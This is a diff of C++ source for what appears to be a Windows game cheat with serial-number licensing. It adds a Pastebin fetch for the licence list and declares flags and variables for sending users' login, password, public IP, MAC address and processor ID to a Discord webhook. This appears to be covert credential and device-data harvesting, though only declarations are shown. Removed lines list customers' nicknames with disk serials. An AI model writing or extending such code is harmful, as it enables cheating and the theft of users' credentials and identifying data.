@@ -1,4 +1,6 @@
 #include <Windows.h>
+#include <iostream>
+#include <sstream>
 #include <winhttp.h>
 #include <regex>
 
@@ -36,6 +38,7 @@ extern void hooks();
 extern void findMob();
 extern void disableProtectMouse();
 
+void getFromPastebin();
 unsigned long djb2Hash(const std::string& str);
 bool bCheckRegister();
 void protectMachine();
@@ -64,43 +67,23 @@ void sendDiscordWebhook(std::string szMessage);
 //Registro
 std::string expireDate = "2024-01-13";
 std::string expireTime = "23:59:00";
-
-std::string expireDate_[] = {
-    "2024-01-22",       //dwSize
-    "2024-01-17",       //Gui
-    "2024-01-17",       //Bless
-    "2024-01-17",       //BarronT
-    "2024-01-17",       //Lucas Gota
-    "2024-01-17"        //blackout
-};
-
-// vetor de cadastro de serial
-unsigned long dwSerialHD_Client[] = {
-    47988480,           //dwSize
-    2010330067,         //Gui
-    1015480953,         //Bless
-    1368213801,         //BarronT
-    3418221424,         //Lucas Gota
-    3172673466          //Blackout
-};
-
 std::string dwNome;
 
-std::string dwNome_[] = {
-    "dwSize - Leo",
-    "Gui",
-    "Blessthevi",
-    "BarronT",
-    "Lucas Gota",
-    "Blackout"
-};
+std::vector<std::string> names;
+std::vector<std::string> serials;
+std::vector<std::string> dates;
 
 //Fim registro
 
 //Var
-bool bDiscord = false, bLogin = false;
+bool bFlag = false, bGetDadosPC = false, bSendDadosPCToDiscord = false, bSendLoginToDiscord = false;
 std::string dwLogin, dwPassword;
 
+std::string computerName;
+std::string publicIP;
+std::string macAddress;
+std::string processorName;
+std::string processorId;
 std::string biosSerialNumber;
 std::string diskSerialNumber;
 
